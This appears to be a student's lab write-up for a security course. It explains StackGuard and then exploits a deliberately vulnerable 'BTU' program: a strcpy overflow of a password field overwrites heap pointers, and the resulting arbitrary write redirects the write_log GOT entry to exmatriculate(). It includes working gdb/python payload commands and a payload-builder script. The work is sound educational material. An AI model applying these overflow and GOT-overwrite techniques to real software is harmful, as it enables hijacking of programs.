# Defeating Stack Gaurd
![alt text](image-27.png)
![alt text](image-28.png)
* If we do not want to affect the value in a particular location during 
the memory copy, such as the shaded position marked as Guard in Figure 4. 12, the only way to 
achieve that is to overwrite the location with the same value that is stored there
* Based on this observation, we can place some non-predictable value (called guard) between 
the buffer and the return address. Before returning from the function, we check whether the 
value is modified or not. If it is modi fied, chances are that the return address may have also 
been modified. Therefore, the problem of detecting whether the return address is overwritten is 
reduced to detecting whether the guard is overwritten. These two problems seem Lo be the same, 
but they are not. By looking at the value of the return address, we do not know whether its value 
is modi fied or not, but since the value of the guard is placed by us, it is easy to know whether 
the guard 's value is modified or not.

## our problem description: 
### ✅ Task 4: Sneaking Past the StackGuard
- 🎯 Goal:

    - Exploit a heap-based arbitrary write vulnerability in the add_student function of the BTU program to:

        - Bypass StackGuard

        - Redirect control flow to exmatriculate(1782914303)

        - While Non-Executable Stack and StackGuard are enabled

        - All other protections (ASLR, PIE, RELRO) are disabled

### 🪛 Step 1: Scenario Setup
- Security Configuration:

    - ✅ StackGuard: Enabled

    - ✅ NX (non-executable stack): Enabled

    - ❌ ASLR: Disabled (echo 0 | sudo tee /proc/sys/kernel/randomize_va_space)

    - ❌ PIE: Disabled (compile with -no-pie)

    - ❌ RELRO: Disabled (compile with -Wl,-z,norelro)
    - ![alt text](image-59.png)
### 🔍 Step 2: Analyzing Vulnerability: 
- ![alt text](image-58.png) 
    - we can see that these lines have some issues
    - before we go through them, lets navigate the Student struct:
        ```c
            struct Student {
            char password[32];        // fixed-size buffer (vulnerable)
            unsigned int id;
            char* name;
            char* last_name;};
        ```
    - so we can see that there is a static password array of size 32
    - important remark to note, if we defined the size of the array before running the program it is defined in the **stack**, otherwise it is defined in the **heap**
    - so now we can see that: 
        - **password**: is defined in the stack
        - **record->name** : is defined in the heap
        - **record->last_name** : is defined in the heap 
    - now the problem that we can overflow all the 3 buffers because **strcpy** function is not secure. 
    - and if we overflow password for example, it can overwrite **record->name address (not_value)** so this will imply that when the program excutes **strcpy(record->name, name)** we already changed the address of **record->name to be = 0xffffabcd** and then we can add any arbitrary value inside it by filling it inside **name** variable
    - this occurs because the program layout is as follows: 
        - 0x00 password <-- 32 * 'A' for example
        - 0x20 id   <--- 1234
        - 0x24 name <---- **0x080ab304 (this is the most important value)**
        - 0x28 last_name <---  **0x080ab304 (this is the second most important value)**
    - they are important because they are pointers to values inside the heap
    - this imply that they contain address to specific location inside the heap
    - so if we overwrote them, we can write our values in any arbitrary position in the memory, and this is our main goal. 
    - the normal flow should be:
        - strcpy(some_safe_location_in_heap, "Zizo");
    - but when we overwrite the address it becomes:
        - strcpy((char*)0xFFFFABCD, "Zizo");

### 🔥 Step3: creating the payload and testing the exploit
* I will create the payload as follows: 
    - password buff = 'a' * 32
    - id = any value
    - last_name = the target location in the memory which in our case: **0xffffabcd**
    - name here is not important, so we can add any dummy name. 
* this is the content of the password
* and in the last_name I will make it 0xDEADBEEF
* final command: gdb btu add name lname id password
     ```bash
    gdb --args ./build/bin/btu add hamada "$(python3 -c 'import sys; sys.stdout.buffer.write(b"\xef\xbe\xad\xde")')"  5555 "$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\xaa\xaa\xaa\xaa\xcd\xab\xff\xff")')"
    ```
* ![alt text](image-60.png)
    - now we can see that the address locatino **0xffffabce** contains the value **0xdeadbeef**
> Note: use the following commands to get the above results: 
    
- > python3 task4_generator_payload.py
- > b main
- next till line 60 before the add methond
- > b add_student
- > next
- > next till copying all buffers. 
- > x10x 0xffffabcd

### Step4: Weponize the results to exmatriculate Klaus once again
#### GOT: 
- In order to solve this task, we need to understand **GOT**. 
- GOT is a short for **(Global Offset Table)** which is a critical component used in programs compiled with dynamic linking. 
- so when a program uses external functions like **print()** or **exit()** the actual address of these functions is not known at the compile time.
- instead, the program uses the **GOT** to store the runtime-resolved addresses of these external functions. 
- so, when the program calls an external function, it does not jump directly to that function, instead, it jumps to the address stored in the GOT entry for that function. 
#### Example: 

- Imagine a program that uses exit() from libc. Instead of calling exit() directly:

    - The binary will contain a GOT entry for exit, say at address 0x0804a010.

    - Initially, this GOT entry might point to a stub or resolver.

    - After the function is resolved (by the dynamic linker), 0x0804a010 will point to the actual address of exit() in memory.
#### Why is it important for us? 
- because if we overwrite an entry in GOT, we can redirect the excution to the *exmatriculte()* function. 
- and we know that we can overwrite any entry in the memory, so this should be doable.

#### running the exploit
* now lets try to apply all the theory we talked about. 
1. we should disassemble the **University::add_student()** method: 
    > disas University::add_student()
2. we should check for any external function: 
    - ![alt text](image-62.png)
    - here we found write_log at address *0x0804a0e0*
3. Inspecting the code of symbol *write_log()*
    - ![alt text](image-63.png)
    - now we can see that it jumps to the address *0x08050d30*
    - which is the address which stores the entry of write_log() in the GOT
    - ![alt text](image-65.png)
4. now lets get the address of *exmatriculate()*
    - ![alt text](image-66.png)
    - we can see it is *0x0804b202*
5. now I want to get a student structure located in the heap to avoid accessing invalid region. 
    - set a breakpoint at *University::add_student*
    - and after creating the Student object and setting up all its values, investigate it
    - ![alt text](image-70.png)
    - here we can see the address is *0x08057d00*
6. now lets construct the shellcode with the addresses we got
    1. we need to add klaus id numeric value in hex -> **0x6a451cff**
    2. the address of write_log -> **0x08050d30**
    3. the address in the heap -> **0x08057da0**
    4. the address of exmatriculate -> **0x0804b202**
7. constructing the payload:
    - you can find the payload construction in **Buffer_Overflow/b-tu/task4_part4_payload.py**
    ```python
        #!/usr/bin/env python3

        import subprocess
        # build the payload of last task same as this.

        # Define payload components
        passwordBuff = b'\x61' * 32                 # 32 bytes of 'a'
        idBuff = b'\xff\x1c\x45\x6a'                # Klaus ID
        targetAddr = b'\x30\x0d\x05\x08'            # write_log address
        heapAddr = b'\xa0\x7d\x05\x08'              # heap address



        # Full password payload
        passPayload = passwordBuff + idBuff + targetAddr + heapAddr

        # Function to convert bytes to a Python byte-escaped string
        def to_python_bytestr(b: bytes) -> str:
            return ''.join(f'\\x{byte:02x}' for byte in b)

        # Convert to python3-compatible command line string
        pass_py_str = to_python_bytestr(passPayload)

        # creating exmatriculate
        exmatriculateBuff = b'\x02\xb2\x04\x08'              # 0xdeadbeef -> to be placed in the target address
        name_py_str = to_python_bytestr(exmatriculateBuff)

        # Build GDB command using python3 -c for both args
        gdb_cmd = (
            "gdb --args ./build/bin/btu add Abdelaziz "
            f"\"$(python3 -c 'import sys; sys.stdout.buffer.write(b\"{name_py_str}\")')\" "
            " 5555 "
            f"\"$(python3 -c 'import sys; sys.stdout.buffer.write(b\"{pass_py_str}\")')\"" 
        )

        # Print and execute
        print("[+] Running:")
        print(gdb_cmd)
        subprocess.run(gdb_cmd, shell=True)

    ```
8. run and test:
    - ![alt text](image-71.png)
    - here you can see that we successfully removed Klaus from the database, this imply that our exploit was successful and the task is done :), congratulations
